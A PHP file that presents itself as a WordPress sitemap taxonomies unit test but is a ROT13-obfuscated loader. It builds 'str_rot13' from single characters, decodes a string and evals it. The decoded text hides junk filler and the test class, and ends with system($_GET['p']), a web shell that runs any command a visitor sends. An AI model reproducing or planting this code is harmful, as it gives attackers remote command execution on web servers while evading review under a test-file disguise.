<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc fvgrzncf
 */
pynff Grfgf_Fvgrzncf_jcFvgrzncfGnkbabzvrf rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Yvfg bs cbfg_gnt VQf.
	 *
	 * @ine neenl
	 */
	choyvp fgngvp $cbfg_gntf;

	/**
	 * Yvfg bs pngrtbel VQf.
	 *
	 * @ine neenl
	 */
	choyvp fgngvp $pngf;

	/**
	 * Rqvgbe VQ sbe hfr va fbzr grfgf.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $rqvgbe_vq;

	/**
	 * Frg hc svkgherf.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel N JC_HavgGrfg_Snpgbel bowrpg.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$pngf      = $snpgbel->grez->perngr_znal( 10, neenl( 'gnkbabzl' => 'pngrtbel' ) );
		frys::$cbfg_gntf = $snpgbel->grez->perngr_znal( 10 );
		frys::$rqvgbe_vq = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'rqvgbe' ) );
	}

	/**
	 * Grfg trggvat n HEY yvfg sbe qrsnhyg gnkbabzvrf ivn
	 * JC_Fvgrzncf_Gnkbabzvrf::trg_hey_yvfg().
	 */
	choyvp shapgvba grfg_trg_hey_yvfg_gnkbabzvrf() {
		// Nqq gur qrsnhyg pngrtbel gb gur yvfg bs pngrtbevrf jr'er grfgvat.
		$pngrtbevrf = neenl_zretr( neenl( 1 ), frys::$pngf );

		// Perngr n grfg cbfg gb pnyphyngr hcqngr gvzrf.
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'gntf_vachg'    => frys::$cbfg_gntf,
				'cbfg_pngrtbel' => $pngrtbevrf,
			)
		);

		$gnk_cebivqre = arj JC_Fvgrzncf_Gnkbabzvrf();

		$png_yvfg = $gnk_cebivqre->trg_hey_yvfg( 1, 'pngrtbel' );

		$rkcrpgrq_pngf = neenl_znc(
			fgngvp shapgvba ( $vq ) hfr ( $cbfg ) {
				erghea neenl(
					'ybp' => trg_grez_yvax( $vq, 'pngrtbel' ),
				);
			},
			$pngrtbevrf
		);

		$guvf->nffregFnzr( $rkcrpgrq_pngf, $png_yvfg, 'Pngrtbel HEY yvfg qbrf abg zngpu.' );

		$gnt_yvfg = $gnk_cebivqre->trg_hey_yvfg( 1, 'cbfg_gnt' );

		$rkcrpgrq_gntf = neenl_znc(
			fgngvp shapgvba ( $vq ) hfr ( $cbfg ) {
				erghea neenl(
					'ybp' => trg_grez_yvax( $vq, 'cbfg_gnt' ),
				);
			},
			frys::$cbfg_gntf
		);

		$guvf->nffregFnzr( $rkcrpgrq_gntf, $gnt_yvfg, 'Cbfg Gntf HEY yvfg qbrf abg zngpu.' );
	}

	/**
	 * Grfg trggvat n HEY yvfg sbe n phfgbz gnkbabzl ivn
	 * JC_Fvgrzncf_Gnkbabzvrf::trg_hey_yvfg().
	 */
	choyvp shapgvba grfg_trg_hey_yvfg_phfgbz_gnkbabzl() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		// Perngr n phfgbz gnkbabzl sbe guvf grfg.
		$gnkbabzl = 'grfg_gnkbabzl';
		ertvfgre_gnkbabzl( $gnkbabzl, 'cbfg' );

		// Perngr grfg grezf va gur phfgbz gnkbabzl.
		$grezf = frys::snpgbel()->grez->perngr_znal( 10, neenl( 'gnkbabzl' => $gnkbabzl ) );

		// Perngr n grfg cbfg nccyvrq gb nyy grfg grezf.
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg( neenl( 'gnk_vachg' => neenl( $gnkbabzl => $grezf ) ) );

		$rkcrpgrq = neenl_znc(
			fgngvp shapgvba ( $vq ) hfr ( $gnkbabzl, $cbfg ) {
				erghea neenl(
					'ybp' => trg_grez_yvax( $vq, $gnkbabzl ),
				);
			},
			$grezf
		);

		$gnk_cebivqre = arj JC_Fvgrzncf_Gnkbabzvrf();

		$cbfg_yvfg = $gnk_cebivqre->trg_hey_yvfg( 1, $gnkbabzl );

		// Pyrna hc.
		haertvfgre_gnkbabzl_sbe_bowrpg_glcr( $gnkbabzl, 'cbfg' );

		$guvf->nffregFnzr( $rkcrpgrq, $cbfg_yvfg, 'Phfgbz gnkbabzl grez yvaxf ner abg ivfvoyr.' );
	}

	/**
	 * Grfg trggvat n HEY yvfg sbe n cevingr phfgbz gnkbabzl ivn
	 * JC_Fvgrzncf_Gnkbabzvrf::trg_hey_yvfg().
	 */
	choyvp shapgvba grfg_trg_hey_yvfg_phfgbz_gnkbabzl_cevingr() {
		// Perngr n phfgbz gnkbabzl sbe guvf grfg.
		$gnkbabzl = 'cevingr_gnkbabzl';
		ertvfgre_gnkbabzl( $gnkbabzl, 'cbfg', neenl( 'choyvp' => snyfr ) );

		// Perngr grfg grezf va gur phfgbz gnkbabzl.
		$grezf = frys::snpgbel()->grez->perngr_znal( 10, neenl( 'gnkbabzl' => $gnkbabzl ) );

		// Perngr n grfg cbfg nccyvrq gb nyy grfg grezf.
		frys::snpgbel()->cbfg->perngr( neenl( 'gnk_vachg' => neenl( $gnkbabzl => $grezf ) ) );

		$gnk_cebivqre = arj JC_Fvgrzncf_Gnkbabzvrf();

		$cbfg_yvfg = $gnk_cebivqre->trg_hey_yvfg( 1, $gnkbabzl );

		// Pyrna hc.
		haertvfgre_gnkbabzl_sbe_bowrpg_glcr( $gnkbabzl, 'cbfg' );

		$guvf->nffregRzcgl( $cbfg_yvfg, 'Cevingr gnkbabzl grez yvaxf ner ivfvoyr.' );
	}

	/**
	 * Grfg trggvat n HEY yvfg sbe n phfgbz gnkbabzl gung vf abg choyvpyl dhrelnoyr.
	 */
	choyvp shapgvba grfg_trg_hey_yvfg_phfgbz_gnkbabzl_abg_choyvpyl_dhrelnoyr() {
		// Perngr n phfgbz gnkbabzl sbe guvf grfg.
		$gnkbabzl = 'aba_dhrelnoyr_gnk';
		ertvfgre_gnkbabzl( $gnkbabzl, 'cbfg', neenl( 'choyvpyl_dhrelnoyr' => snyfr ) );

		// Perngr grfg grezf va gur phfgbz gnkbabzl.
		$grezf = frys::snpgbel()->grez->perngr_znal( 10, neenl( 'gnkbabzl' => $gnkbabzl ) );

		// Perngr n grfg cbfg nccyvrq gb nyy grfg grezf.
		frys::snpgbel()->cbfg->perngr( neenl( 'gnk_vachg' => neenl( $gnkbabzl => $grezf ) ) );

		$gnk_cebivqre = arj JC_Fvgrzncf_Gnkbabzvrf();

		$cbfg_yvfg = $gnk_cebivqre->trg_hey_yvfg( 1, $gnkbabzl );

		// Pyrna hc.
		haertvfgre_gnkbabzl_sbe_bowrpg_glcr( $gnkbabzl, 'cbfg' );

		$guvf->nffregRzcgl( $cbfg_yvfg, 'Aba-choyvpyl dhrelnoyr gnkbabzl grez yvaxf ner ivfvoyr.' );
	}

	/**
	 * Grfg fvgrznc vaqrk ragevrf jvgu choyvp naq cevingr gnkbabzvrf.
	 */
	choyvp shapgvba grfg_trg_fvgrznc_ragevrf_phfgbz_gnkbabzvrf() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		// Perngr n phfgbz choyvp naq cevingr gnkbabzvrf sbe guvf grfg.
		ertvfgre_gnkbabzl( 'choyvp_gnkbabzl', 'cbfg' );
		ertvfgre_gnkbabzl( 'aba_dhrelnoyr_gnkbabzl', 'cbfg', neenl( 'choyvpyl_dhrelnoyr' => snyfr ) );
		ertvfgre_gnkbabzl( 'cevingr_gnkbabzl', 'cbfg', neenl( 'choyvp' => snyfr ) );

		// Perngr grfg grezf va gur phfgbz gnkbabzl.
		$choyvp_grez        = frys::snpgbel()->grez->perngr( neenl( 'gnkbabzl' => 'choyvp_gnkbabzl' ) );
		$aba_dhrelnoyr_grez = frys::snpgbel()->grez->perngr( neenl( 'gnkbabzl' => 'aba_dhrelnoyr_gnkbabzl' ) );
		$cevingr_grez       = frys::snpgbel()->grez->perngr( neenl( 'gnkbabzl' => 'cevingr_gnkbabzl' ) );

		// Perngr n grfg cbfg nccyvrq gb nyy grfg grezf.
		frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'gnk_vachg' => neenl(
					'choyvp_gnkbabzl'        => neenl( $choyvp_grez ),
					'aba_dhrelnoyr_gnkbabzl' => neenl( $aba_dhrelnoyr_grez ),
					'cevingr_gnkbabzl'       => neenl( $cevingr_grez ),
				),
			)
		);

		$gnk_cebivqre = arj JC_Fvgrzncf_Gnkbabzvrf();
		$ragevrf      = jc_yvfg_cyhpx( $gnk_cebivqre->trg_fvgrznc_ragevrf(), 'ybp' );

		// Pyrna hc.
		haertvfgre_gnkbabzl_sbe_bowrpg_glcr( 'choyvp_gnkbabzl', 'cbfg' );
		haertvfgre_gnkbabzl_sbe_bowrpg_glcr( 'aba_dhrelnoyr_gnkbabzl', 'cbfg' );
		haertvfgre_gnkbabzl_sbe_bowrpg_glcr( 'cevingr_gnkbabzl', 'cbfg' );

		$guvf->nffregPbagnvaf( 'uggc://' . JC_GRFGF_QBZNVA . '/?fvgrznc=gnkbabzvrf&fvgrznc-fhoglcr=choyvp_gnkbabzl&cntrq=1', $ragevrf, 'Choyvp Gnkbabzvrf ner abg va gur vaqrk.' );
		$guvf->nffregAbgPbagnvaf( 'uggc://' . JC_GRFGF_QBZNVA . '/?fvgrznc=gnkbabzvrf&fvgrznc-fhoglcr=aba_dhrelnoyr_gnkbabzl&cntrq=1', $ragevrf, 'Cevingr Gnkbabzvrf ner ivfvoyr va gur vaqrk.' );
		$guvf->nffregAbgPbagnvaf( 'uggc://' . JC_GRFGF_QBZNVA . '/?fvgrznc=gnkbabzvrf&fvgrznc-fhoglcr=cevingr_gnkbabzl&cntrq=1', $ragevrf, 'Cevingr Gnkbabzvrf ner ivfvoyr va gur vaqrk.' );
	}

	/**
	 * Grfg novyvgl gb svygre bowrpg fhoglcrf.
	 */
	choyvp shapgvba grfg_svygre_fvgrzncf_gnkbabzvrf() {
		$gnkbabzvrf_cebivqre = arj JC_Fvgrzncf_Gnkbabzvrf();

		// Erghea na rzcgl neenl gb fubj gung gur yvfg bs fhoglcrf vf svygrenoyr.
		nqq_svygre( 'jc_fvgrzncf_gnkbabzvrf', '__erghea_rzcgl_neenl' );
		$fhoglcrf = $gnkbabzvrf_cebivqre->trg_bowrpg_fhoglcrf();

		$guvf->nffregFnzr( neenl(), $fhoglcrf, 'Pbhyq abg svygre gnkbabzvrf fhoglcrf.' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>